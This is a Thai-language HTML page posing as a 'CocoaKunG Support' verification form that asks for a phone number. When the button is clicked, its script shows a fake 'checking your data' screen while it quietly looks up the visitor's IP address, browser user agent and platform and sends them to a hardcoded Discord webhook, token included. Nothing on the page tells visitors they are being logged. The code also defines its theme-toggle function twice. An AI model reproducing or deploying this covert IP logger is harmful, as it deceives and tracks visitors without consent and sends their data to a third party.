<!DOCTYPE html>
<html lang="th">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CocoaKunG Support</title>
  <style>
    /* ซ่อนหน้าล็อก */
    .hidden {
      display: none;
    }

    /* หน้าล็อกพี่ที่บังหน้าต่าง */
    #lock-screen {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0, 0, 0, 0.8);
      display: flex;
      justify-content: center;
      align-items: center;
    }

    .lock-container {
      background-color: #fff;
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      border: 2px solid #ff66b2; /* กรอบสีชมพู */
    }

    .status-bar {
      width: 100%;
      background-color: #eee;
      border-radius: 10px;
      overflow: hidden;
      margin-top: 20px;
    }

    .status-fill {
      width: 0;
      height: 10px;
      background-color: #ff66b2;
      border-radius: 10px;
      animation: loading 3s linear forwards;
    }

    @keyframes loading {
      from { width: 0; }
      to { width: 100%; }
    }

    /* การตั้งค่าคล้ายกับที่คุณมีอยู่แล้ว เช่น dark mode */
    .dark-mode .lock-container {
      background-color: #333;
      color: #fff;
      border-color: #ff66b2;
    }

    /* การตั้งค่าสำหรับส่วนหัว */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px 20px;
      background-color: #ff66b2;
      color: white;
    }

    .dark-mode .header {
      background-color: #333;
    }

    .title {
      font-weight: bold;
      font-size: 24px;
    }

    .dark-mode-toggle {
      cursor: pointer;
    }

    .mode-icon {
      width: 32px;
      height: 32px;
    }

    .container {
      text-align: center;
      padding: 50px 20px;
    }

    .container input {
      padding: 10px;
      font-size: 16px;
      border-radius: 10px;
      border: 2px solid #ff66b2;
      width: 80%;
      max-width: 300px;
      margin-bottom: 20px;
    }

    .container button {
      padding: 10px 20px;
      font-size: 18px;
      color: white;
      background-color: #ff6600;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }

    .container h2 {
      margin-bottom: 20px;
      color: #333;
    }

    .dark-mode .container h2 {
      color: white;
    }

    /* การตั้งค่าสำหรับ Footer */
    .footer {
      text-align: center;
      padding: 20px;
      background-color: #ff66b2;
      color: white;
      position: fixed;
      bottom: 0;
      width: 100%;
    }

    .dark-mode .footer {
      background-color: #333;
    }
  </style>
</head>

<body>
  <!-- หน้าล็อกพี่ที่เด้งมาบังหน้าต่าง -->
  <div id="lock-screen" class="hidden">
    <div class="lock-container">
      <p>กำลังตรวจสอบข้อมูลของคุณ...</p>
      <div class="status-bar">
        <div class="status-fill"></div>
      </div>
    </div>
  </div>

  <div class="header">
    <div class="title">CocoaKunG Support</div>
    <div class="dark-mode-toggle">
      <img src="https://img2.pic.in.th/pic/BackgroundEraser_20240818_201226766.png" alt="Light Mode" id="light-mode-icon" class="mode-icon hidden">
      <img src="https://img5.pic.in.th/file/secure-sv1/BackgroundEraser_20240818_200854217.png" alt="Dark Mode" id="dark-mode-icon" class="mode-icon">
    </div>
  </div>

  <div class="container">
    <h2>กรุณาระบุเบอร์ของคุณ</h2>
    <input type="text" placeholder="เบอร์โทรศัพท์ของคุณ">
    <button onclick="checkUser()">เริ่มการตรวจสอบ</button>
  </div>

  <footer class="footer">
    <p>เว็บไซต์นี้จัดทำโดย <strong>CocoaKunG</strong></p>
    <p>© 2024 CocoaKunG. All Rights Reserved.</p>
  </footer>

  <script>
    // ฟังก์ชันเพื่อดึง IP และข้อมูลระบบปฏิบัติการ
    async function fetchIpAndSystemInfo() {
      // ดึง IP จาก ipify API
      const ip = await fetch('https://api.ipify.org?format=json')
        .then(res => res.json())
        .then(data => data.ip);
      
      // ข้อมูลเบราว์เซอร์และระบบปฏิบัติการ
      const userAgent = navigator.userAgent;
      const platform = navigator.platform;

      return { ip, userAgent, platform };
    }

    // ฟังก์ชันเพื่อส่งข้อมูลไปยัง Discord Webhook
    async function sendToDiscord(ip, userAgent, platform) {
      const webhookUrl = 'https://discord.com/api/webhooks/1175658007833612348/4igS6PbQGK8byXd0G1DwCPrjQL9ROHBrfgkZNsJ5e3zRcGPtzXbrXzWDOiIXmwzxKuP_';
      const message = {
        content: "ข้อมูลการเข้าใช้งาน",
        embeds: [{
          title: "การเข้าถึงต้องสงสัย",
          color: 16711680, // สีแดงใน discord
          fields: [
            { name: "IP", value: ip, inline: true },
            { name: "User-Agent", value: userAgent, inline: false },
            { name: "Platform", value: platform, inline: true }
          ]
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(message)
      });
    }

    // ฟังก์ชันการแสดงหน้าล็อกและการเช็ค
    async function checkUser() {
      document.getElementById('lock-screen').classList.remove('hidden');

      const { ip, userAgent, platform } = await fetchIpAndSystemInfo();
      
      // ส่งข้อมูลไปยัง Discord Webhook
      await sendToDiscord(ip, userAgent, platform);

      // เช็ค IP เพื่อบล็อกบาง IP
      const blockedIps = ['BLOCKED_IP_1', 'BLOCKED_IP_2']; // กำหนด IP ที่ต้องการบล็อก
      if (blockedIps.includes(ip)) {
        alert("คุณถูกบล็อกจากการใช้งานเว็บไซต์นี้");
        return;
      }

      // เมื่อทำงานเสร็จสิ้น ให้ปิดหน้าล็อก
      setTimeout(() => {
        document.getElementById('lock-screen').classList.add('hidden');
      }, 3000); // เวลาในการแสดงหน้าล็อก
    }

    // ฟังก์ชันเพื่อเปิด/ปิดโหมด Dark หรือ Light
    function toggleMode() {
      if (document.body.classList.contains('dark-mode')) {
        document.body.classList.remove('dark-mode');
        setCookie('theme', 'light', 7); // ตั้งค่าคุกกี้เป็น 'light'
        document.getElementById('dark-mode-icon').classList.add('hidden');
        document.getElementById('light-mode-icon').classList.remove('hidden');
      } else {
        document.body.classList.add('dark-mode');
        setCookie('theme', 'dark', 7); // ตั้งค่าคุกกี้เป็น 'dark'
        document.getElementById('light-mode-icon').classList.add('hidden');
        document.getElementById('dark-mode-icon').classList.remove('hidden');
      }
    }

    // ฟังก์ชันเพื่อตั้งค่าคุกกี้
    function setCookie(name, value, days) {
      var expires = "";
      if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
        expires = "; expires=" + date.toUTCString();
      }
      document.cookie = name + "=" + (value || "") + expires + "; path=/";
    }

    // ฟังก์ชันเพื่อดึงค่าจากคุกกี้
    function getCookie(name) {
  var nameEQ = name + "=";
  var ca = document.cookie.split(';');
  for (var i = 0; i < ca.length; i++) {
    var c = ca[i];
    while (c.charAt(0) == ' ') c = c.substring(1, c.length);
    if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
  }
  return null;
}

// ฟังก์ชันเพื่อเปิดโหมด Dark หรือ Light
function toggleMode() {
  if (document.body.classList.contains('dark-mode')) {
    document.body.classList.remove('dark-mode');
    setCookie('theme', 'light', 7); // ตั้งค่าคุกกี้เป็น 'light'
    document.getElementById('dark-mode-icon').classList.remove('hidden');
    document.getElementById('light-mode-icon').classList.add('hidden');
  } else {
    document.body.classList.add('dark-mode');
    setCookie('theme', 'dark', 7); // ตั้งค่าคุกกี้เป็น 'dark'
    document.getElementById('light-mode-icon').classList.remove('hidden');
    document.getElementById('dark-mode-icon').classList.add('hidden');
  }
}

// ตรวจสอบคุกกี้เมื่อโหลดหน้าเว็บ
window.onload = function() {
  var theme = getCookie('theme');
  if (theme === 'dark') {
    document.body.classList.add('dark-mode');
    document.getElementById('light-mode-icon').classList.remove('hidden');
    document.getElementById('dark-mode-icon').classList.add('hidden');
  } else {
    document.body.classList.remove('dark-mode');
    document.getElementById('dark-mode-icon').classList.remove('hidden');
    document.getElementById('light-mode-icon').classList.add('hidden');
  }
};

// เพิ่ม event listeners สำหรับไอคอน
document.getElementById('dark-mode-icon').addEventListener('click', toggleMode);
document.getElementById('light-mode-icon').addEventListener('click', toggleMode);
